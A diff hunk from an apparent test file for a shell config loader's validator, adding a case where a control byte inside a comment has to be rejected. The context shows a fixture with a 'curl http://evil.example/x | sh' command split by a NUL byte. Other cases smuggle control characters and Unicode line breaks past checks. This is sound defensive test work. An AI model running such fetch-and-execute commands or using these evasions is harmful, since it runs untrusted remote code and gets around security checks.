@@ -13820,6 +13820,11 @@ _NUL_CURL = 'TEST_CMD="cu\x00rl http://evil.example/x | sh"\n'
     ('SUBSTRATE_PROFILE="strict" \n', False),
     ('SUBSTRATE_PROFILE="strict"\x1c\n', False),
     ('SUBSTRATE_PROFILE="strict"\x7f\n', False),
+    # A control byte inside a comment. Only the shell loader's byte check refuses it:
+    # its printable-ASCII check skips comment lines. BSD grep (macOS) also catches the
+    # NUL cases above in that second check, so without this case the byte check could
+    # be removed there and every case still passed.
+    ('# x\x01y\nSUBSTRATE_PROFILE="strict"\n', False),
     # Line breaks to str.splitlines() readers, even inside a comment (v3.10.5 audit).
     ('# x\u0085SUBSTRATE_CODE_SUFFIXES=.zz\nSUBSTRATE_PROFILE="strict"\n', False),
     ('# x\u2028y\nSUBSTRATE_PROFILE="strict"\n', False),
